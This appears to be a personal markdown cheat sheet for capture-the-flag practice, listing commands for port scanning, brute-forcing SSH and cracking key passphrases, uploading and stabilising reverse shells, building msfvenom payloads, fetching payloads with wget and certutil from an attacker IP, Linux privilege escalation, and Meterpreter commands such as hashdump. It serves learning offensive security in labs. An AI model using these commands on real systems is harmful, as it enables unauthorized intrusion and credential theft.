# CTF-Notes

## How to connect to the vpn

```sudo openvpn [YOUR .ovpn FILE]```

## How to check if we are properly connected?

```ping [IP]```

## Get my IP

```ip a``` or ```ifconfig``` 

If we only want tun0 ```ifconfig tun0```

## Where to find all the useful stuff in Kali Linux

> /usr/share/ 

For downloaded stuff

> /opt/

## PORTS

* **Check for open ports:** 
	* ```nmap -sV -sC [IP]``` or ``` nmap [IP]``` 
	* or (for all open ports and information) ```namp -T4 -p- -A [IP]``` 
	* or with only top 10000 ports   ```namp -T4 -A [IP]```
	* [Guide](https://www.stationx.net/nmap-cheat-sheet/)

### Types of ports and how to access them:
 #### Port 80 (HTTP)
 - Usually HTTP 
	 - **Enumerate Directories**
		  * ```gobuster dir -u "[URL | IP]" -w [Wordlist] ``` [Guide](https://redteamtutorials.com/2018/11/19/gobuster-cheatsheet/)
		  * Or you can use ```dirbuster```
	- **Find URL information**
		-  ```enum4linux -A [IP | URL]```
 
  #### Port 22 (SSH)
  
 -  Usually ssh [Guide](https://phoenixnap.com/kb/linux-ssh-commands)
    - ** You can connect to ssh using the command ```ssh```**
      * ```ssh [USERNAME]@[IP]```
      * It will ask for a password:
        * We can try and crack the password like: 
				* ```hydra -l [USERNAME | WORDLIST] -P [PASSWORD | WORDLIST] [IP] ssh```
    * **If we find a private RSA key we can:**
      * Save it in our local machine
      * Mark it as private
		  *  ```chmod 600 [keyfile]```
      * Try to access it
		  *  ```ssh -i [keyfile] [user]@[IP]```
      * If it asks for a passphrase:
        * We can try and crack it like:
          * Mark the RSA key as executable for john the ripper 			```/usr/share/john/ssh2john.py [keyfile] > [newjohnfile]```
          * Brute-force it
				  * ```john [newjohnfile] --wordlist=/usr/share/wordlists/rockyou.txt```
    * **Send a file to SSH**
		*  ```scp [FILE] [user]@[IP]:/dev/shm```


  ### **Port 21:** (FTP)
   * Usually FTP
	   * **You can connect to FTP using the command** ```ftp```
      * ```ftp [IP]```
        * It will ask for logging information but you can sometimes use: ```anonymous``` without password

		*  ** You can retrieve files inside ftp using ```get```**
			*   ```get [FILE]```
			
		- **You can put files inside the ftp system using**
			- ```put [FILE]```
			
 
 ### **Port 445/139**  (SMB)
 
 - Usually SMB
	 - **Find SMB version***
		 - We can use metasploit
			 - ```msfconsole```
			 - ```use auxiliary/scanner/smb/smb_version```
			 - Set options
			 - ```run```
    * **If the server is running SAMBA you can try to list the clients like**:
		- ```smbclient -L \\\\[IP]\\``` 
	- **You can connect to a SMB client using **
		- ```smbclient \\\\IP\\Client]```
	- **Sometimes we can connect anonymously**
		- ```smbclient \\\\IP\\anonymous```
    - **We can retrieve files using**
		-  ```get [file]```
	
 ### **Port 135**  (RTC)
 
 - **Get RTC Info**
	 - ```rpcinfo -p [IP]```
## Check if input allows python/python3

We can do ```python -c "print('Hello')"``` or ```python3 -c "print('Hello')"```

## Make a python script executable from command line

 1. Add ```#!/usr/bin/env python``` at the beginning of the script
 2. Execute the file ```python myfile.py```
	 1. Or Make the file executable ```chmod +x myfile.py```
	 2. Execute the script ```./myfile.py```

## Check for hidden files

### Linux 
- ```ls -la```

## If commands like "cat" are not allowed

We can use ```grep . file``` or ```while read line; do echo $line; done < file```
  
## Reverse Shell

* If a website allows input or file upload without sanitation it will be possible to upload a reverse shell in order to gain access to the system.
  * **Upload the shell:**
    * File upload shell: <a href="php-reverse-shell.php">PHP shell</a> <- We must modify the IP(Our IP) and the PORT(9999)
    * Reverse shell in input: [More one liner shells](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

##  Stabilize reverse shell
1. Inside the shell ```python -c 'import pty; pty.spawn(\"/bin/bash\")'```
2. Ctrl+Z
3. ```stty raw -echo```
4. ```fg```
5. ```export TERM=xterm```

## Creating a  Payload with Msfvenom 

- ```msfvenom -p [Type of payload] LHOST=[Your listening host] LPORT=[Your listening port] -f [Type of file] > [Name of file to be created]```
- [Cheatsheet](https://netsec.ws/?p=331)

## Listening to reverse shells
- ```nc -nlvp [Your Port]```
                  
## Privilege Escalation

### Linux 
* If you can send files or download files in the machine use linpeas 
  * If you are on SSH:  ```scp linpeas.sh [user]@[IP]:/dev/shm```, ```./linpeas.sh | tee linpeas.txt```
* If you are inside of the vulnerable system you can try to escalate your user privilege as root like:
  * Use ```sudo -l``` to see what types of privileges the user has.
    * If you see ```(ALL : ALL) ALL```, just call ```sudo bash``` or ```sudo su``` and you will become root.
    * Other privileges: [Check for exploits](https://gtfobins.github.io/)
      * tar: ```sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh```

### Meterpreter
- We can try getting input information
	- ```history```
- We can try to gain system with the build in tool
	- ```getsystem```
- We can try the suggester
	- ```background```
	- ```search suggester```
	- ```use 0```
	- ```set session [meterpreter session number]```

### Windows
- We can see the processes and find what we can run as other users and migrate
	- ```ps```
	- ```migrate [process number]```
      
## Find all files in system by name.

- We can do ```find / -name [FILENAME]``` or ```find /* | grep [FILENAME]```

## Search For possible Exploits
- Just the information
	- ```searchsploit [System Info]```
- Find and execute them
	- ```msfconsole```
	- ```search [System info]```
	- ``` use [Exploit]```
	- ```set options```
	- ```run```

## Set up python server to deliver payload
- ```python -m SimpleHTTPServer [Port]```
	- The server will be created in the location where we called the command

## Get payload on the shell
### Linux
- ```wget http://[YOUR IP]/[PAYLOAD]```

### Windows
- ```certutil -urlcache -f [Your Server with the file] [Where you want to put the file in the machine]```

## Connect to user in machine 
- We can use psexec
	- You can use the one in metasploit 
	- You can use the one by [impacket](https://github.com/SecureAuthCorp/impacket)
		-``` psexec.py [User]:'[Password]'@[IP]```

## Meterpreter useful commands
### Commands

See **user privilege** (NT AUTHORITY\SYSTEM == Highest):

```
getuid
```

Show **system info**:

```
sysinfo
```

Attempt to **elevate user privilege**

```
getsystem
```

Find the **hash that stores local user passwords**:

```
hashdump
```

Open **cmd**:

```
shell
```

-	**Inside cmd**:

	Navigate Between Folders
	```
	cd [Dir Name]
	```
	
	Show Folders Content
	```
	dir
	```
	
	Read File
	```
	type [File Name]
	```
	
## Criptography

* **Base 64:** If we see a combination of letters and numbers, it may be Base 64 encoding, the best way to find out if it contains at least one '=' at the end.
  * How to decode:
    * In linux: ```echo [BASE64 STRING] | base64 -d``` 
    * Online: [Cyberchef](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true))

